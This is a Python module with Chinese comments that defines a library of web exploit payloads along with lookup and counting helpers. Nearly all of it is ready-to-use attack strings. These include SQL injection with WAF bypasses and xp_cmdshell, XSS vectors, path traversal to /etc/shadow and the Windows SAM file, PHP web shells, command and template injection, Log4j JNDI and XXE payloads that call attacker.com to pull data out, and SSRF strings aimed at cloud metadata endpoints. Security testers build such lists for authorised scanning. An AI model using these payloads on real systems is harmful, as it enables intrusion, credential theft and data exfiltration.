#!/usr/bin/env python3
"""
Payload库 - 包含各类漏洞利用Payload
包含: SQL注入, XSS, LFI, RCE, SSRF, XXE等
"""

from typing import Dict, List


class PayloadLibrary:
    """Payload管理器 - 500+ Payloads"""
    
    SQLI = {
        "mysql": {
            "detection": [
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "\" OR \"1\"=\"1",
                "' OR 1=1--", "' OR 1=1#", "admin'--", "1' AND '1'='1", "1' AND '1'='2",
                "') OR ('1'='1", "1 AND 1=1", "1 AND 1=2", "1' ORDER BY 1--",
                "1' ORDER BY 10--", "1' ORDER BY 100--", "' OR ''='", "' OR 'x'='x",
                "') OR ('x'='x", "' OR 1=1/*", "' OR 1=1;--", "') OR (1=1--",
            ],
            "union": [
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT 1,@@version,3,4,5--", "' UNION SELECT 1,database(),3,4,5--",
                "' UNION SELECT 1,user(),3,4,5--",
                "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--",
                "' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns--",
                "' UNION ALL SELECT 1,2,3,4,5--", "-1' UNION SELECT 1,2,3,4,5--",
                "0' UNION SELECT 1,2,3,4,5--", "1' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT 1,2,3,4,5,6--", "' UNION SELECT 1,2,3,4,5,6,7--",
                "' UNION SELECT 1,2,3,4,5,6,7,8--", "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            ],
            "error_based": [
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
                "' AND exp(~(SELECT * FROM (SELECT database())a))--",
                "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database())) USING utf8)))--",
                "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
                "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database())),1)--",
            ],
            "time_based": [
                "' AND SLEEP(5)--", "' AND SLEEP(5)#", "'; SELECT SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(1=2,SLEEP(5),0)--", "' OR SLEEP(5)--",
                "1' AND BENCHMARK(5000000,SHA1('test'))--",
                "' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
            "waf_bypass": [
                "' /*!50000OR*/ '1'='1", "' %00OR '1'='1", "' /%2a%2a/OR/%2a%2a/ '1'='1",
                "' OR/**/1=1--", "' oR '1'='1", "' Or '1'='1", "' OR%0A1=1--",
                "' UN/**/ION SE/**/LECT 1,2,3--", "' UNION%0ASELECT%0A1,2,3--",
                "' /*!UNION*/ /*!SELECT*/ 1,2,3--", "'+OR+1=1--", "' OR 'a'='a",
                "'%20OR%201=1--", "'-1' UNION SELECT 1,2,3--",
                "' AND 1=1 UNION SELECT 1,2,3--", "1'%20or%20'1'='1", "1'%0Aor%0A'1'='1",
                "1'/**/or/**/'1'='1", "' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--",
            ]
        },
        "mssql": {
            "detection": ["' OR 1=1--", "' OR '1'='1", "'; WAITFOR DELAY '0:0:5'--"],
            "union": ["' UNION SELECT NULL--", "' UNION SELECT @@version--", "' UNION SELECT name FROM sysdatabases--"],
            "stacked": ["'; EXEC xp_cmdshell('whoami')--", "'; EXEC sp_configure 'show advanced options', 1--"],
            "time_based": ["'; WAITFOR DELAY '0:0:5'--", "'; IF 1=1 WAITFOR DELAY '0:0:5'--"],
        },
        "postgresql": {
            "detection": ["' OR 1=1--", "'; SELECT pg_sleep(5)--"],
            "union": ["' UNION SELECT NULL--", "' UNION SELECT version()--", "' UNION SELECT current_database()--"],
            "time_based": ["'; SELECT pg_sleep(5)--", "' AND pg_sleep(5)--"],
        },
        "oracle": {
            "detection": ["' OR 1=1--", "' OR '1'='1"],
            "union": ["' UNION SELECT NULL FROM DUAL--", "' UNION SELECT banner FROM v$version--"],
            "time_based": ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"],
        }
    }
    
    XSS = {
        "basic": [
            "<script>alert('XSS')</script>", "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>", "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>", "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>", "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>", "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>", "<iframe src=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">Click</a>", "<div onmouseover=alert('XSS')>X</div>",
            "<form action=\"javascript:alert('XSS')\"><input type=submit>",
            "<details open ontoggle=alert('XSS')>", "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>", "<keygen onfocus=alert('XSS') autofocus>",
            "<frameset onload=alert('XSS')>",
        ],
        "encoded": [
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
        ],
        "waf_bypass": [
            "<ScRiPt>alert('XSS')</ScRiPt>", "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script >alert('XSS')</script >", "<script\t>alert('XSS')</script\t>",
            "<script\n>alert('XSS')</script\n>", "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>alert('XSS')//<</script>", "<img src=`x`onerror=alert('XSS')>",
            "<img/src=x/onerror=alert('XSS')>", "<img\tsrc=x\tonerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>", "<body/onload=alert('XSS')>",
            "'-alert('XSS')-'", "\"-alert('XSS')-\"", "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "<img src=x:alert(alt) onerror=eval(src) alt='XSS'>",
            "<svg><script>alert&#40;1&#41;</script></svg>",
        ],
        "dom_based": [
            "#<script>alert('XSS')</script>", "javascript:alert('XSS')//",
            "'-alert(1)-'", "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>", "\"onmouseover=\"alert('XSS')\"",
            "'onmouseover='alert(\"XSS\")'", "\" onclick=alert(1)//",
            "' onclick=alert(1)//", "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"><img src=x onerror=alert(1)//",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "-->'\"onclick=alert(1)//\"><img/src=x onerror=alert``>",
        ]
    }
    
    LFI = {
        "linux": [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "../../../../../../../etc/passwd", "/etc/passwd",
            "file:///etc/passwd", "/proc/self/environ", "/proc/self/cmdline",
            "/var/log/apache2/access.log", "/var/log/apache2/error.log",
            "/var/log/nginx/access.log", "/var/log/nginx/error.log",
            "/etc/shadow", "/etc/hosts", "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf", "/proc/version", "/proc/self/fd/0",
            "/var/log/auth.log", "/var/log/syslog", "/etc/crontab",
        ],
        "windows": [
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\Windows\\win.ini",
            "C:\\boot.ini", "C:\\inetpub\\wwwroot\\web.config",
            "C:\\Windows\\System32\\config\\SAM", "C:\\WINDOWS\\system32\\config\\SYSTEM",
        ],
        "encoded": [
            "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "....%2f....%2f....%2fetc%2fpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd", "..%25c0%25af..%25c0%25afetc/passwd",
        ],
        "php_wrapper": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=../config.php",
            "php://input", "php://fd/0",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id", "phar://./test.phar/test.txt",
        ],
        "null_byte": [
            "../../../etc/passwd%00", "../../../etc/passwd\x00",
            "../../../etc/passwd%00.jpg", "../../../etc/passwd\x00.png",
        ]
    }
    
    RCE = {
        "command_injection": [
            "; id", "| id", "|| id", "& id", "&& id", "`id`", "$(id)",
            "; whoami", "| whoami", "; cat /etc/passwd", "| cat /etc/passwd",
            "& echo vulnerable &", "; sleep 5", "| sleep 5", "|| sleep 5",
            "& ping -c 3 127.0.0.1 &", "$IFS$9id", "${IFS}id", ";$IFS$9id",
            "a]); system('id'); //", "\n id", "%0a id", "'$(id)'", "\"$(id)\"",
            "|`id`", ";`id`", "||`id`", "&&`id`",
        ],
        "php": [
            "<?php system($_GET['cmd']); ?>", "<?php passthru($_GET['cmd']); ?>",
            "<?php exec($_GET['cmd']); ?>", "<?php shell_exec($_GET['cmd']); ?>",
            "<?php eval($_POST['cmd']); ?>", "${<?php system($_GET['cmd']); ?>}",
            "<?=`$_GET[cmd]`?>", "<?php popen($_GET['cmd'],'r'); ?>",
        ],
        "template_injection": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}",
            "{{self.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}", "#{7*7}", "*{7*7}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "log4j": [
            "${jndi:ldap://attacker.com/a}", "${jndi:rmi://attacker.com/a}",
            "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}",
            "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}",
        ]
    }
    
    SSRF = {
        "basic": [
            "http://127.0.0.1", "http://localhost", "http://127.0.0.1:80",
            "http://127.0.0.1:443", "http://127.0.0.1:22", "http://127.0.0.1:3306",
            "http://0.0.0.0", "http://[::1]", "http://169.254.169.254",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        "bypass": [
            "http://2130706433", "http://0x7f.0x0.0x0.0x1", "http://017700000001",
            "http://127.1", "http://127.0.1", "http://0", "http://0.0.0.0:80",
            "http://localtest.me", "http://127.0.0.1.nip.io",
        ],
        "protocol": [
            "file:///etc/passwd", "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
            "ftp://127.0.0.1", "sftp://127.0.0.1", "ldap://127.0.0.1",
        ]
    }
    
    XXE = {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?x=test">]><foo>&xxe;</foo>',
        ],
        "oob": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>',
        ]
    }
    
    @classmethod
    def get_all(cls, vuln_type: str, category: str = "all", dbms: str = "mysql") -> List[str]:
        """获取指定类型的所有payload"""
        payload_map = {
            "sqli": cls.SQLI, "xss": cls.XSS, "lfi": cls.LFI,
            "rce": cls.RCE, "ssrf": cls.SSRF, "xxe": cls.XXE,
        }
        
        if vuln_type not in payload_map:
            return []
        
        payloads = payload_map[vuln_type]
        
        # SQL注入按数据库类型
        if vuln_type == "sqli":
            payloads = payloads.get(dbms, payloads["mysql"])
        
        if category == "all":
            result = []
            for v in payloads.values():
                if isinstance(v, list):
                    result.extend(v)
            return result
        
        return payloads.get(category, [])
    
    @classmethod
    def count(cls) -> Dict[str, int]:
        """统计payload数量"""
        def _count(d):
            total = 0
            for v in d.values():
                if isinstance(v, dict):
                    total += _count(v)
                elif isinstance(v, list):
                    total += len(v)
            return total
        
        return {
            "sqli": _count(cls.SQLI), "xss": _count(cls.XSS),
            "lfi": _count(cls.LFI), "rce": _count(cls.RCE),
            "ssrf": _count(cls.SSRF), "xxe": _count(cls.XXE),
            "total": _count(cls.SQLI) + _count(cls.XSS) + _count(cls.LFI) + 
                     _count(cls.RCE) + _count(cls.SSRF) + _count(cls.XXE)
        }
